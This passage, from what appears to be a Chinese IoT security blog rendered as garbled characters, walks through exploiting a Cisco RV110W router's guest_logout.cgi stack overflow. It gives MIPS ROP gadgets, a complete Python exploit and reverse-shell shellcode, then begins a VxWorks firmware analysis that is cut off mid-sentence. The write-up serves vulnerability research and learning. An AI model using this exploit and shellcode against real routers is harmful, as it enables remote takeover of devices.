href="https://blogs.360.cn/post/yi-ge-zi-jie-cha-cuo-dao-zhi-Cisco-fang-huo-qiang-lu-you-qi-yuan-cheng-dai-ma-zhi-xing.html">https://blogs.360.cn/post/yi-ge-zi-jie-cha-cuo-dao-zhi-Cisco-fang-huo-qiang-lu-you-qi-yuan-cheng-dai-ma-zhi-xing.html</a></p><p>å¯ä»¥çœ‹åˆ°æ‰“ç å¹¶æ²¡æœ‰æ‰“å…¨2333</p><p><img src="https://pub1-bjyt.s3.360.cn/blog/20200806/upload_b4bfff83d434acd75557b6ef321ffad9.png" alt=""></p><p>å…¨å±€æœç´¢ä¸‹è¿™ä¸ªå­—ç¬¦ä¸²<code>find . | xargs grep -ri &quot;aUzX1IiE&quot;</code></p><p>å‘ç°åŒ¹é…çš„éƒ½åœ¨sbinç›®å½•ä¸‹ï¼Œå¹¶ä¸”å¤§å¤šè½¯è¿æ¥åˆ°rcæ–‡ä»¶</p><p><img src="https://i.loli.net/2021/09/01/G5t8JTlPqnHKFL4.png" alt="ls -al _sbin.png"></p><p>ç›´æ¥strings rcï¼Œç½‘ä¸Šéšä¾¿æ‰¾ä¸ªåœ¨çº¿çš„hashè§£å¯†ç½‘ç«™ä¸€æŠŠæ¢­</p><p><img src="https://i.loli.net/2021/09/01/qy49Ms62VhD85Jo.png" alt=""></p><p><img src="https://i.loli.net/2021/09/01/Cr6RDKjhkp8QEMz.png" alt=""></p><p>ç„¶åå°±å¯ä»¥telnetåˆ°è·¯ç”±å™¨äº†ï¼Œæ³¨æ„ï¼Œæ˜ç¡®ä¸€ç‚¹ï¼Œè™½ç„¶getshellï¼Œä½†æ˜¯ï¼Œè¿™åªæ˜¯æ–¹ä¾¿æˆ‘ä»¬æœ¬åœ°è°ƒè¯•ï¼Œè¿œç¨‹å¹¶æ²¡æœ‰å¼€telnetæœåŠ¡ï¼Œåªæœ‰443ç«¯å£å¼€äº†</p><p><img src="https://i.loli.net/2021/09/01/XcwICEAyqMp3FiD.png" alt=""></p><h4 id="æ¼æ´æŒ–æ˜"><a href="#æ¼æ´æŒ–æ˜" class="headerlink" title="æ¼æ´æŒ–æ˜"></a>æ¼æ´æŒ–æ˜</h4><p>è¿™ä¸¤ä¸ªcveéƒ½è¯´çš„æ˜¯webæ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆæ‰¾åˆ°webå¯¹åº”çš„binary</p><p>åœ¨æµè§ˆå™¨ç«¯è®¿é—®ç½‘å€çš„æ—¶å€™ï¼Œå¯¹åº”çš„urlä¸º10.10.10.1/login.cgiï¼Œæ‰€ä»¥å…¨å±€æœç´¢ä¸‹</p><p><img src="https://i.loli.net/2021/09/01/bqBjpPylGvkrufQ.png" alt=""></p><p>åªæœ‰httpdåŒ¹é…</p><p>å› ä¸ºå‘ç°æ–‡ä»¶ç³»ç»Ÿä¸­æœ‰wgetå¯ä»¥ç”¨ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨æœ¬æœºèµ·ä¸€ä¸ªç®€å•çš„http-serverï¼Œé€šè¿‡telnetåˆ°è·¯ç”±å™¨ä¸‹è½½ä¸€ä¸ªåŒ…å«netstatçš„busyboxï¼Œä¸è¿‡æ‡’ï¼Œå°±æ²¡æ</p><p>ç„¶åå°†äºŒè¿›åˆ¶ç¨‹åºè½½å…¥idaï¼Œå› ä¸ºæœ‰æ–°ç‰ˆæœ¬çš„å›ºä»¶ï¼Œä½¿ç”¨diaphora diffä¸€ä¸‹</p><p>å› ä¸ºç›®æ ‡æ˜¯å‰å°getshellï¼Œæ‰€ä»¥guest_logout_cgiæ¯”è¾ƒå¯ç–‘ï¼ŒæŸ¥çœ‹ä¼ªä»£ç å¦‚ä¸‹</p><p><img src="https://i.loli.net/2021/09/01/l34Iuxj5WenGtvV.png" alt=""></p><p><img src="https://i.loli.net/2021/09/01/fJTmyB6d3QcOFpX.png" alt=""></p><p>å‘ç°ç äº†sscanf</p><p>å…¶ä¸­sscanfçš„æ¡ä»¶<code>&quot;%[^;];%*[^=]=%[^\n]&quot;</code>é‡Œï¼Œ% è¡¨ç¤ºé€‰æ‹©ï¼Œ%* è¡¨ç¤ºè¿‡æ»¤ï¼Œä¸­æ‹¬å·æ‹¬èµ·æ¥çš„æ˜¯ç±»ä¼¼æ­£åˆ™</p><ol><li><code>%[^;]</code>ï¼šåˆ†å·å‰çš„æ‰€æœ‰å­—ç¬¦éƒ½è¦</li><li><code>;%*[^=]</code>ï¼šåˆ†å·åï¼Œç­‰å·å‰çš„å­—ç¬¦éƒ½ä¸è¦</li><li><code>=%[^\n]</code>ï¼šç­‰å·åï¼Œæ¢è¡Œç¬¦å‰çš„æ‰€æœ‰å­—ç¬¦éƒ½è¦</li></ol><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœè¾“å…¥å­—ç¬¦ä¸²â€aaa;bbb=cccâ€ï¼Œä¼šå°†aaaå’Œcccå†™å…¥å¯¹åº”å˜é‡ï¼Œå¹¶æ²¡æœ‰é™åˆ¶é•¿åº¦ï¼Œä¼šå¯¼è‡´æ ˆæº¢å‡º</p><p>åˆ†æä¸€ä¸‹å¦‚ä½•åˆ°è¾¾è¿™ä¸ªsscanfæ‰€åœ¨åˆ†æ”¯</p><p><img src="https://i.loli.net/2021/09/01/K8ZUxf7tRiH3hJs.png" alt=""></p><ol><li>cmacï¼šmacåœ°å€æ ¼å¼</li><li>cipï¼šipv4åœ°å€æ ¼å¼</li><li>submit_buttonï¼šåŒ…å«status_guestnet.aspå­—ç¬¦ä¸²</li></ol><p>ç»§ç»­æµ‹è¯•æ¼æ´ï¼Œé€šè¿‡å‘åŒ…æµ‹è¯•æ¥åˆ¤æ–­å‚æ•°æ˜¯é€šè¿‡GETå‚æ•°ä¼ é€’è¿˜æ˜¯é€šè¿‡POSTå‚æ•°æ¥ä¼ é€’çš„</p><p>Get.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://10.10.10.1/guest_logout.cgi&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line">print(payload)</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line">requests.get(url, data=payload, verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>Post.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://10.10.10.1/guest_logout.cgi&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line">requests.post(url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>ç»è¿‡æµ‹è¯•å‘ç°æ˜¯é€šè¿‡postæ¥ä¼ é€’å‚æ•°çš„ï¼ˆpostå‘è¿‡å»å°±å´©äº†ï¼Œå°±åƒå¹³å¸¸çš„pwnç¨‹åºå´©æºƒä¸€æ ·ï¼‰</p><p>ç„¶åå…·ä½“è°ƒè¯•ä¸‹ï¼Œæœ¬åœ°å¼€ä¸ªæœåŠ¡å™¨ï¼Œè·¯ç”±å™¨ä½œå®¢æˆ·ç«¯ä¸‹è½½ä¸ªgdbserverè¿‡æ¥</p><p><img src="https://i.loli.net/2021/09/01/9laSF1kdXDgLN6G.png" alt="http-server.png"></p><p>æ„Ÿè°¢æµ·ç‰¹å®éªŒå®¤æœé›†çš„å„ç§gdbserverï¼Œæ„Ÿè°¢X1ngå¸ˆå‚…è¯•å‡ºæ¥gdbserver-7.12-mipsel-mips32rel2-v1-sysvå¯ä»¥ç”¨</p><p><a href="https://gitee.com/h4lo1/HatLab_Tools_Library/tree/master/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F/gdbserver">https://gitee.com/h4lo1/HatLab_Tools_Library/tree/master/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F/gdbserver</a></p><p>æ³¨æ„ï¼Œä¸‹åˆ°tmpç›®å½•ï¼Œå…¶ä»–ç›®å½•ä¸å¯å†™</p><p>é€šè¿‡psæŸ¥çœ‹httpdçš„è¿›ç¨‹å·<code>ps | grep httpd</code>ï¼Œç„¶ågdbserveræŒ‚ä¸€ä¸‹</p><p><img src="https://i.loli.net/2021/09/01/mNxIyWJlBsncj5F.png" alt="gdbserver.png"></p><p>ç„¶åè¿œç¨‹gdbè°ƒremote</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch -q httpd# quiet</span><br><span class="line">set arch mips</span><br><span class="line">set endian little</span><br><span class="line">target remote 10.10.10.1:1234</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/01/5vOX2Dl3Zu4qfVz.png" alt=""></p><p>payload ç”¨cyclicç”Ÿæˆçš„å­—ç¬¦ä¸€å‘æ‰“è¿‡å»æœç„¶å´©æºƒäº†</p><p><img src="https://i.loli.net/2021/09/01/Hpxh36LGen7zg9M.png" alt=""></p><p>ç®—ä¸‹åç§»ï¼Œæ³¨æ„åˆ°pcæŒ‡é’ˆç°åœ¨çš„å€¼</p><p><img src="https://i.loli.net/2021/09/01/8HI9Qgd5XvSJ2Wb.png" alt=""></p><h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><p>mipsæ¶æ„ç¡¬ä»¶å¹¶ä¸æ”¯æŒnxï¼Œæ‰€ä»¥åˆ©ç”¨æ–¹å¼é€šå¸¸ä¸ºåŠ«æŒç¨‹åºæµæ‰§è¡Œshellcode</p><p>ç”±äºsscanfæ ˆæº¢å‡ºï¼Œæ‰€ä»¥ä¸èƒ½æœ‰ç©ºå­—èŠ‚ï¼Œè€Œç¨‹åºæœ¬èº«çš„gadgetéƒ½æ˜¯æœ‰ç©ºå­—èŠ‚çš„ã€‚ã€‚ã€‚</p><p>è¿™æ—¶å€™è‡ªç„¶æƒ³åˆ°ç”¨libcçš„gadgetï¼Œä½†æ˜¯ï¼Œæ¯”è¾ƒè¯¡å¼‚çš„ä¸€ç‚¹æ˜¯ï¼Œå®ƒçš„libcåŸºå€æ¯æ¬¡éƒ½ä¸å˜ï¼š</p><blockquote><p>æ€ç§‘çš„è¿™ä¸ªè®¾å¤‡ï¼Œhttpdè¿›ç¨‹çš„libcåŸºå€å°±æ˜¯<code>2af98000</code>ï¼Œæ— è®ºä½ æ˜¯é‡å¯è¿›ç¨‹ï¼Œè¿˜æ˜¯å‡çº§ç‰ˆæœ¬ï¼Œè¿™ä¸ªåŸºå€éƒ½ä¸å˜</p><p>é—®äº†å¸¸è€å¸ˆï¼Œå†æ¬¡çŒœæµ‹å¯èƒ½æ˜¯ä¸ºäº†æ•ˆç‡ï¼Œç¼–è¯‘çš„æ—¶å€™å°±æŠŠå†…æ ¸çš„è¿™ä¸ªåŠŸèƒ½å¹²æ‰äº†ï¼Œæˆ–è€…å½“å‰å¹³å°å‹æ ¹å°±ä¸æ”¯æŒè¿™ä¸ªåŠŸèƒ½ã€‚å…ˆå­˜ç–‘ï¼Œæ€»ä¹‹æˆ‘ä»¬å‘ç°åŠ¨æ€åº“çš„åŸºå€éƒ½æ˜¯ä¸å˜çš„ï¼Œæ•…æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç¨‹åºåŠ è½½çš„åŠ¨æ€åº“ä¸­çš„gadgetã€‚</p></blockquote><p>å½³äºï¼Œé‚£å°±ç”¨mipsropæ¥æ‰¾gadgetï¼Œè™½ç„¶æœ‰å¾ˆå¤šåŠ¨æ€åº“ï¼Œä½†æ˜¯é€‰libcæ¯”è¾ƒå¥½ï¼Œç”¨idaåŠ è½½/lib/libc.so.0</p><p>mipsrop.help()å¯æŸ¥çœ‹ç”¨æ³•</p><p>å› ä¸ºè¦æ§åˆ¶registerï¼Œæ‰€ä»¥æ‰¾èƒ½å°†æ ˆåœ°å€åŠ è½½è¿›å¯„å­˜å™¨çš„gadget</p><p>ä¸¤æ¡å¾ˆæœ‰ç”¨çš„gadget</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">|  <span class="number">0x000257A0</span>  |  addiu $a0,$sp,<span class="number">0x58</span>+var_40  |  jalr  $s0  |</span><br><span class="line">|  <span class="number">0x0003D050</span>  |  move $t9,$a0  |  jalr  $a0  |</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ‰‹æ³•ï¼šå°†shellcodeå†™å…¥åˆ°$sp + 0x10çš„ä½ç½®å¤„ï¼Œç„¶åè¦†ç›–s0ä¸ºç¬¬äºŒæ¡gadgetçš„åœ°å€ï¼Œå°†raå¯„å­˜å™¨è¦†ç›–ä¸ºç¬¬ä¸€æ¡gadgetçš„åœ°å€</p><p>è¿™æ ·ä¼šé€ æˆä»€ä¹ˆæ•ˆæœå‘¢ï¼Ÿç¨‹åºè¿”å›æ—¶ï¼Œç¨‹åºæ‰§è¡Œæµè¢«æ§åˆ¶ä¸º0x257a0ï¼Œå»æ‰§è¡Œç¬¬ä¸€æ¡gadgetï¼Œa0 = sp + 0x18ï¼Œjmpåˆ°s0å¯„å­˜å™¨ï¼Œs0å¯„å­˜å™¨å­˜çš„æ˜¯ç¬¬äºŒæ¡gadgetï¼Œç»§è€Œå»æ‰§è¡Œç¬¬äºŒæ¡gadgetï¼Œå°†a0æ”¾åˆ°t9ï¼Œç„¶åjmpåˆ°a0ï¼Œa0å­˜çš„æ˜¯shellcodeçš„åœ°å€ï¼Œäºæ˜¯ç¨‹åºå°±ä¼šæ‰§è¡Œshellcode</p><p>shellcodeç”Ÿæˆç”¨msfvenomï¼Œç”Ÿæˆçš„shellcodeæ²¡æœ‰\x00å­—èŠ‚çš„å­˜åœ¨ï¼Œç”Ÿæˆä¸€ä¸ªå›è¿çš„shell</p><p><img src="https://i.loli.net/2021/09/01/wBACxIlp8Wh3vc9.png" alt="msf.png"></p><p><img src="https://i.loli.net/2021/09/01/3svj6DSaBwnLRmE.png" alt=""></p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;mips&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = <span class="number">0x2af98000</span></span><br><span class="line">jmp_a0 = libc + <span class="number">0x0003D050</span>  <span class="comment"># move  $t9,$a0             ; jalr  $a0</span></span><br><span class="line">jmp_s0 = libc + <span class="number">0x000257A0</span>  <span class="comment"># addiu $a0,$sp,0x38+var_20 ; jalr  $s0</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\xb8\x0e\x3c&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x22\xb8\xce\x35\xe4\xff\xae\xaf\x0a\x64\x0e\x3c\x0a&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x0a\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x01\x01&quot;</span></span><br><span class="line"></span><br><span class="line">pd1 = <span class="string">&quot;status_guestnet.asp&quot;</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">49</span> + \</span><br><span class="line">    p32(jmp_a0) + <span class="string">&#x27;b&#x27;</span> * (<span class="number">85</span> - <span class="number">49</span> - <span class="number">4</span>) + p32(jmp_s0) + <span class="string">&#x27;c&#x27;</span> * <span class="number">0x18</span> + shellcode</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://10.10.10.1/guest_logout.cgi&quot;</span></span><br><span class="line">pd2 = &#123;</span><br><span class="line">    <span class="string">&quot;cmac&quot;</span>: <span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;submit_button&quot;</span>: pd1,</span><br><span class="line">    <span class="string">&quot;cip&quot;</span>: <span class="string">&quot;192.168.1.100&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line">requests.post(url, data=pd2, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/01/5ciSTlNtBKLXjxP.png" alt=""></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/">https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/</a></p><p><a href="https://www.anquanke.com/post/id/224301#h3-7">https://www.anquanke.com/post/id/224301#h3-7</a></p><p><a href="https://www.somd5.com/">https://www.somd5.com/</a></p><p><a href="https://github.com/firmianay/IoT-vulhub/tree/master/Cisco/CVE-2020-3331">https://github.com/firmianay/IoT-vulhub/tree/master/Cisco/CVE-2020-3331</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/mips/rop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/mips/rop/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> iot </tag>
            
            <tag> real world </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NOE77101 vxworksåé—¨è´¦æˆ·åˆ†æ</title>
      <link href="2021/08/25/iot-NOE7701/"/>
      <url>2021/08/25/iot-NOE7701/</url>
      
        <content type="html"><![CDATA[<p>æ˜¨å¤©åˆšå¬äº†è½©ç¥åœ¨HWSå¼€çš„ç¬¬ä¸€å ‚iotå…¥é—¨è¯¾ç¨‹ï¼Œä»Šå¤©æƒ³ç€æ‰¾ä¸ªå›ºä»¶æ¥åˆ†æä¸€ä¸‹ç»ƒç»ƒæ‰‹<br>æœ¬äººå¯¹äºiotå®Œå…¨å°ç™½ï¼Œå‚è€ƒäº†è¯¸å¤šæ–‡ç« æ¥åˆ†ææ­¤å›ºä»¶<br>å›ºä»¶ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/ameng929/NOE77101_Firmware/blob/master/FLASH0/wwwroot/conf/exec/NOE77101.bin">https://github.com/ameng929/NOE77101_Firmware/blob/master/FLASH0/wwwroot/conf/exec/NOE77101.bin</a></p><h2 id="å›ºä»¶é€†å‘åˆ†æ"><a href="#å›ºä»¶é€†å‘åˆ†æ" class="headerlink" title="å›ºä»¶é€†å‘åˆ†æ"></a>å›ºä»¶é€†å‘åˆ†æ</h2><h3 id="å›ºä»¶è¯†åˆ«ä¸è§£å‹"><a href="#å›ºä»¶è¯†åˆ«ä¸è§£å‹" class="headerlink" title="å›ºä»¶è¯†åˆ«ä¸è§£å‹"></a>å›ºä»¶è¯†åˆ«ä¸è§£å‹</h3><p>binwalk åˆ†ææ–‡ä»¶ï¼Œå‘ç°æ˜¯zlibå‹ç¼©æ–‡ä»¶<br><img src="https://i.loli.net/2021/08/25/8QOcELFA3KPG15p.png" alt=""></p><p>binwalk -e åˆ†ç¦»æ–‡ä»¶åï¼Œå¯¹åˆ†ç¦»å‡ºçš„æ–‡ä»¶åˆ†æ</p><p><img src="https://i.loli.net/2021/08/25/QadSAt4MHOrp2EZ.png" alt=""><br>å›ºä»¶çš„ç¬¦å·è¡¨ä½äº0x301E74ï¼Œæ“ä½œç³»ç»Ÿä¸ºVxWorks 2.5</p><p><img src="https://i.loli.net/2021/08/25/iHhbnyd3VRGQJzK.png" alt="binwalk3.png"></p><p>ç¡®å®šCPUæ¶æ„ä¸ºPowerPC big endian</p><h3 id="ç¡®å®šå›ºä»¶å†…å­˜åŠ è½½åœ°å€"><a href="#ç¡®å®šå›ºä»¶å†…å­˜åŠ è½½åœ°å€" class="headerlink" title="ç¡®å®šå›ºä»¶å†…å­˜åŠ è½½åœ°å€"></a>ç¡®å®šå›ºä»¶å†…å­˜åŠ è½½åœ°å€</h3><p>åµŒå…¥å¼ç³»ç»Ÿå›ºä»¶éœ€è¦åŠ è½½åˆ°å†…å­˜ä¸­ç‰¹å®šä½ç½®è¿è¡Œï¼Œè¿™ä¸ªç‰¹å®šä½ç½®å°±æ˜¯å›ºä»¶åŠ è½½åœ°å€<br><strong>å›ºä»¶åŠ è½½åœ°å€ = ç¬¦å·è¡¨ä¸­å­—ç¬¦ä¸²çš„åœ°å€ - ç›¸åº”å­—ç¬¦ä¸²åœ¨å›ºä»¶ä¸­çš„åç§»</strong><br>åµŒå…¥å¼ç³»ç»Ÿå›ºä»¶çš„å‡½æ•°è°ƒç”¨åœ°å€æ˜¯åŸºäºå›ºä»¶åŠ è½½åœ°å€æ‰€è®¡ç®—å‡ºçš„å†…å­˜ä½ç½®ï¼Œè€Œä¸æ˜¯å›ºä»¶ä¸­çš„åœ°å€</p><p>æˆ‘ä»¬æ‰¾åˆ°äº†ç¬¦å·è¡¨çš„åœ°å€ï¼ŒVxWorksç³»åˆ—çš„ç¬¦å·è¡¨çš„ç»„ç»‡è§„åˆ™ï¼Œä»¥16ä¸ªå­—èŠ‚ä¸ºä¸€ç»„æ•°æ®ï¼Œå‰å››ä¸ªå­—èŠ‚æ˜¯0x00ï¼Œä¹‹åå››ä¸ªå­—èŠ‚æ˜¯ç¬¦å·åå­—ç¬¦ä¸²æ‰€åœ¨çš„å†…å­˜åœ°å€ï¼Œåå››ä¸ªæ˜¯ç¬¦å·æ‰€åœ¨çš„å†…å­˜åœ°å€ï¼Œæœ€åå››ä¸ªæ˜¯ç¬¦å·çš„ç±»å‹<br><img src="https://i.loli.net/2021/08/26/Wi1MIhAySxHGCqF.png" alt=""></p><p>æ ¹æ®ç¬¦å·è¡¨æ‰¾åˆ°å­—ç¬¦ä¸²é™„è¿‘ï¼Œç„¶ååœ¨é™„è¿‘æ‰¾å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°æœ€åä¸€ä¸ªå­—ç¬¦ä¸²æ‰€åœ¨çš„åœ°å€ï¼Œå› ä¸ºå­—ç¬¦ä¸²è¡¨ä¸­çš„æœ€åä¸€ä¸ªå­—ç¬¦ä¸²åœ¨ç¬¦å·è¡¨ä¸­ç¬¬ä¸€ä¸ªè¢«å¼•ç”¨ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨å­—ç¬¦ä¸²åœ¨å†…å­˜ä¸­çš„åœ°å€å‡å»åœ¨æ–‡ä»¶ä¸­çš„åœ°å€å°±èƒ½å¾—åˆ°å†…å­˜åŠ è½½åœ°å€ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯APP_STATION_MODBUS<br><img src="https://i.loli.net/2021/08/26/tmG2VUJTOgP9iq3.png" alt=""></p><p>å†…å­˜åŠ è½½åœ°å€ = 0x27656C - 0x26656C = 0x10000</p><h3 id="ä¿®å¤å‡½æ•°å"><a href="#ä¿®å¤å‡½æ•°å" class="headerlink" title="ä¿®å¤å‡½æ•°å"></a>ä¿®å¤å‡½æ•°å</h3><p>æ‰¾åˆ°ç¬¦å·è¡¨çš„ç»“æŸåœ°å€ï¼š<br><img src="https://i.loli.net/2021/08/26/heXT8WNQU29wrPb.png" alt="010-3.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">loadaddress = <span class="number">0x10000</span> <span class="comment">#åŠ è½½åœ°å€</span></span><br><span class="line">eaStart = <span class="number">0x301e64</span> + loadaddress<span class="comment">#ç¬¦å·è¡¨èµ·å§‹åœ°å€</span></span><br><span class="line">eaEnd = <span class="number">0x3293b4</span> + loadaddress<span class="comment">#ç¬¦å·è¡¨ç»“æŸåœ°å€</span></span><br><span class="line"> </span><br><span class="line">ea = eaStart</span><br><span class="line">eaEnd = eaEnd</span><br><span class="line"><span class="keyword">while</span> ea &lt; eaEnd:</span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    create_strlit(idc.get_wide_dword(ea - offset), BADADDR)</span><br><span class="line">    sName = get_strlit_contents(idc.get_wide_dword(ea - offset))</span><br><span class="line">    print(sName)</span><br><span class="line">    <span class="comment">#å¦‚æœå‡½æ•°åä¸ä¸ºç©º</span></span><br><span class="line">    <span class="keyword">if</span> sName:</span><br><span class="line">        sName = <span class="built_in">str</span>(sName)</span><br><span class="line">    <span class="comment">#è·å–å‡½æ•°åœ°å€</span></span><br><span class="line">        eaFunc = idc.get_wide_dword(ea - offset + <span class="number">4</span>)</span><br><span class="line">        <span class="comment">#é‡å‘½ååœ°å€ï¼Œå°†å‡½æ•°åœ°å€ä¸å‡½æ•°åå¯¹åº”</span></span><br><span class="line">        print(<span class="built_in">type</span>(sName))</span><br><span class="line">        set_name(eaFunc, sName, SN_NOWARN)</span><br><span class="line">        <span class="comment">#åˆ†ææŒ‡å®šåœ°å€ä»£ç åŒº</span></span><br><span class="line">        create_insn(eaFunc)</span><br><span class="line">        <span class="comment">#è®¾ç½®å‡½æ•°å§‹æœ«åœ°å€</span></span><br><span class="line">        add_func(eaFunc, BADADDR)</span><br><span class="line">    <span class="comment">#æ¯æ¬¡å åŠ 16å­—èŠ‚ï¼Œæ¯æ¡ç¬¦å·è¡¨è®°å½•å 16ä¸ªå­—èŠ‚</span></span><br><span class="line">    ea = ea + <span class="number">16</span></span><br></pre></td></tr></table></figure><h3 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><p>VxWorksçš„å¯åŠ¨ä»£ç usrInitåˆ†æ<br>è¿™ä¸ªå‡½æ•°æ˜¯åœ¨ramä¸­æ‰§è¡Œçš„ç¬¬ä¸€ä¸ªå‡½æ•°ï¼Œä¸»è¦å®Œæˆå¯¹bssæ®µçš„æ¸…é™¤ã€è®¾ç½®å¼‚å¸¸å‘é‡ã€ç„¶åè°ƒç”¨sysHwinit()åˆå§‹åŒ–ç¡¬ä»¶ï¼ŒVxWorkså›ºä»¶è‡ªèº«æœ‰ä¸‰ä¸ªsectionï¼Œtextï¼Œdataå’Œbssï¼Œæ‰€ä»¥æ ¹æ®usrinité¦–å…ˆä¼šå¤„ç†bssæ®µï¼Œå¯ä»¥æ‰¾åˆ°bssæ®µçš„åœ°å€è¿›è€Œè®¡ç®—å‡ºå›ºä»¶çš„åŠ è½½åœ°å€ï¼ˆè·‘é¢˜äº†ï¼Œè¿™æ˜¯æ ¹æ®åˆ«çš„æ–‡ç« æä¸€å¥ï¼‰ï¼ŒusrKernelInit()ä¼šåˆå§‹åŒ–ç³»ç»Ÿå†…æ ¸ï¼Œç„¶ååšcacheç›¸å…³çš„æ“ä½œï¼Œæ¥ä¸‹æ¥ä¼šåˆ›å»ºç¬¬ä¸€ä¸ªä»»åŠ¡usrRoot</p><p>æ•´ä¸ªè°ƒç”¨å…³ç³»<code>_sysinit -&gt; usrInit 